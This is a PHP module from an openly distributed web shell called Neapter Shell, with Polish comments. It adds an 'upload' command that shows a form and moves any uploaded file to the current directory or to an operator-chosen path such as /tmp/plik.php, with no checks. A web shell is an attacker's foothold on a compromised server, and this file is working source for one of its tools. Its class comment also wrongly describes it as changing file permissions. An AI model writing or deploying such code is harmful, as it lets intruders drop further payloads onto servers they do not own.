<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Zmienianie uprawnien dla pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleUpload extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array('upload');
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.1 2016-06-09 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
upload - Wrzucanie pliku na serwer. Jeśli nie podano ścieżki to plik zostanie wrzucony do katalogu, w którym się znajdujemy

    Użycie:
        upload
        upload /tmp/plik.php
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        if (($aFileData = Request::getFiles('file')) !== FALSE) {
            $sUploadLocation = getcwd() . '/';

            if ($this->oArgs->getNumberOfParams() === 0) {
                $sUploadLocation .= basename($aFileData['name']);
            } else {
                $sUploadLocation = $this->oArgs->getParam(0);
            }

            return sprintf(
                "Plik %swgrany",
                (! @rename($aFileData['tmp_name'], $sUploadLocation) ? 'nie ' : '')
            );
        }

        return sprintf('<form action="%s" method="post" enctype="multipart/form-data">' .
            '<pre id="console"><h1>Wrzuć plik</h1><input type="file" name="file"/></pre>' .
            '<input type="text" name="cmd" value="%s" size="110" id="cmd"/>' .
            '<input type="submit" name="submit" value="Wrzuć" id="cmd-send"/></form>',
            Request::getCurrentUrl(),
            htmlspecialchars(Request::getPost('cmd'))
        );
    }

}
